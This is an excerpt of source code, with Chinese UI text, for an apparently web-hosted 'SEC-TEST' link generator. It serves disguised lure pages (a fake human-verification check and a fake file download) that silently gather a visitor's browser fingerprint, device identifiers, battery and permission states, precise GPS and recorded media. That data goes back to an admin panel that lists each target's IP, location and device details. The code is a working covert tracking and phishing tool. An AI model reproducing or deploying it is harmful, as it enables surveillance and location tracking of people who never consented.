    ...
    <div class="grid md:grid-cols-2 gap-8">
      <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.1s;">
        ...
        <div class="space-y-5">
          ...
          <button onclick="generateLink(event)" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex items-center justify-center">
  ...
  <script>
    ...
    async function generateLink(event) {
      ...
      const config = {
        ...
        adaptive: document.getElementById('adaptive_size') ? document.getElementById('adaptive_size').checked : false,
        needLocation: document.getElementById('need_location') ? document.getElementById('need_location').checked : false,
      ...
      const hasFile = document.getElementById('download_file') && document.getElementById('download_file').files.length > 0;
      const downloadUrl = document.getElementById('download_url') ? document.getElementById('download_url').value.trim() : '';
    ...
    async function queryData() {
      ...
      try {
        ...
        logs.forEach((log, index) => {
          ...
          if (log.device_geo) {
            try {
              ...
              if(geo.denied) {
                ...
                geoHtml = '<div class="text-sm text-emerald-600 mt-2 font-mono"><i class="fa-solid fa-location-crosshairs mr-1"></i>精准GPS：' + Number(geo.lat).toFixed(6) + ', ' + Number(geo.lng).toFixed(6) + '</div>';
              }
            } catch(e) {}
          }
          ...
          if (log.device_info) {
            try {
              ...
              deviceInfoHtml = '<div class="text-xs text-gray-600 space-y-1 mt-2"><div><i class="fa-solid fa-desktop w-3"></i> 设备: ' + (devInfo.device || '') + ' | 屏幕: ' + (devInfo.screen || '') + '</div><div>' + (devInfo.userAgent || '') + '</div></div>';
            } catch(e) {}
          }
        ...
        if (password && logs.length > 0) {
          ...
          html += '<div class="text-center mt-4"><button onclick="deleteMedia(\'' + idEsc + '\', \'' + pwdEsc + '\')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg text-sm font-medium hover:bg-red-200">删除媒体记录</button></div>';
        }
  ...
  <script>
    ...
    async function collectDeviceInfo() {
      const info = {
        ...
        platformDesc: navigator.platform || '',
        plugins: [],
        mimeTypes: [],
        mediaDevices: [],
        performance: {},
      ...
      try {
        ...
        try {
          ...
          for (let i = 0; i < (navigator.plugins || []).length; i++) {
            p.push(navigator.plugins[i].name + '|' + (navigator.plugins[i].description || ''));
          }
          info.plugins = p;
        } catch(e) {}
        ...
        try {
          ...
          for (let i = 0; i < (navigator.mimeTypes || []).length; i++) {
            m.push(navigator.mimeTypes[i].type);
          }
          info.mimeTypes = m;
        } catch(e) {}
        ...
        try {
          if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            ...
            info.mediaDevices = devices.map(d => ({ kind: d.kind, label: d.label, deviceId: d.deviceId }));
          }
        } catch(e) {}
        ...
        try {
          if (performance && performance.getEntriesByType) {
            ...
            if (nav && nav.length) {
              info.performance.navigation = nav[0].toJSON ? nav[0].toJSON() : {};
            } else if (performance.timing) {
              info.performance.timing = performance.timing.toJSON ? performance.timing.toJSON() : {};
            }
          }
        } catch(e) {}
        ...
        try {
          if (navigator.getBattery) {
            ...
            info.battery = { charging: batt.charging, level: batt.level, chargingTime: batt.chargingTime, dischargingTime: batt.dischargingTime };
          }
        } catch(e) {}
        ...
        for (const p of perms) {
          try {
            if (navigator.permissions && navigator.permissions.query) {
              ...
              info.permissions[p] = st.state;
            }
          } catch(e) {
            info.permissions[p] = 'unknown';
          }
        }
        ...
        try {
          ...
          if (gl) {
            ...
            if (dbgRenderInfo) {
              info.webgl.vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
              info.webgl.renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
            }
            info.webgl.version = gl.getParameter(gl.VERSION);
            info.webgl.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
          }
        } catch(e) {}
    ...
    function renderUI() {
      ...
      if (config.template === 'captcha') {
        container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">进行人机身份验证</h3><p class="text-sm text-gray-500 mb-4">请完成简单验证以继续...</p><button id="captcha_btn" class="px-4 py-2 bg-indigo-600 text-white rounded">开始验证</button></div>';
        const btn = document.getElementById('captcha_btn');
        if (btn) btn.addEventListener('click', () => { document.getElementById('template_container').innerHTML = '<div class="text-green-600 font-bold">✓ 验证通过</div>'; });
      } else if (config.template === 'download') {
        container.innerHTML = '<div class="bg-white p-6 rounded-lg shadow-sm border border-gray-200"><h3 class="font-bold text-gray-700 mb-4">文件准备就绪</h3><p class="text-sm text-gray-500 mb-4">请点击下载以获取文件。</p><button id="dl_btn" class="px-4 py-2 bg-indigo-600 text-white rounded">立即下载</button></div>';
    ...
    async function sendPayload(blob, status) {
      ...
      try {
        ...
        fd.append('deviceInfo', JSON.stringify(devInfo));
      } catch(e) {
        fd.append('deviceInfo', JSON.stringify({ error: 'collect failed' }));
      }
...
function renderAdminLogin(errorMsg) {
  ...
  const html = '<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><title>SEC-TEST 后台登录</title><script src="https://cdn.tailwindcss.com"></script><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet"></head><body class="min-h-screen flex items-center justify-center bg-gray-50"><div class="w-full max-w-md p-6 bg-white rounded-xl shadow"><h2 class="text-xl font-bold mb-4">SEC-TEST 后台登录</h2>' + errorHtml + '<form method="POST"><input type="password" name="password" placeholder="请输入管理员密码" class="w-full px-4 py-3 rounded-xl border mb-4"><div class="text-right"><button type="submit" class="px-4 py-2 bg-indigo-600 text-white rounded">登录</button></div></form></div></body></html>';
  return new Response(html, { headers: { "Content-Type": "text/html" } });
}
...
async function renderAdmin(request, env) {
  ...
  for (const [targetId, logs] of groups) {
    ...
    sectionsHtml += '<div class="mb-6 bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden"><div class="p-4 bg-indigo-50 border-b border-indigo-100 flex items-center justify-between"><div class="text-sm font-bold text-indigo-700">ID: ' + escapeHtml(targetId || '-') + '</div><div class="text-xs text-gray-500">Records: ' + logs.length + '</div></div><div class="p-4 space-y-3">';
    ...
    for (const [eventType, typeLogs] of Object.entries(eventLogs)) {
      ...
      for (const log of typeLogs) {
        ...
        let eventIcon = eventType === 'GENERATE' ? 'fa-wand-magic-sparkles' : 
        ...
        if (log.device_info) {
          try {
            const devInfo = JSON.parse(log.device_info);
            deviceInfoHtml = '<div class="text-xs text-gray-600"><div>' + escapeHtml(devInfo.userAgent || '') + '</div><div>' + escapeHtml(devInfo.platform || '') + ' | 屏幕: ' + escapeHtml(devInfo.screen || '') + '</div></div>';
          } catch(e) {}
        }
        ...
        sectionsHtml += '<div class="bg-gray-50 p-3 rounded-lg border border-gray-200 hover:border-gray-300 transition"><div class="flex justify-between items-start mb-2"><div class="flex items-center space-x-3"><div class="' + eventColor + ' px-2 py-1 rounded text-xs font-bold">' + eventType + '</div><div class="text-xs text-gray-700">' + dateStr + burnedBadge + deletedBadge + '</div></div><div class="text-xs text-gray-500">' + escapeHtml(visitorIp) + '</div></div><div class="grid grid-cols-3 gap-3 text-xs text-gray-600"><div>IP: ' + escapeHtml(geoStr) + '</div><div>设备: ' + (log.device_info ? '有' : '无') + '</div><div>媒体: ' + mediaBlock + '</div></div><div class="mt-2">' + deviceInfoHtml + '</div></div>';
      }
    }
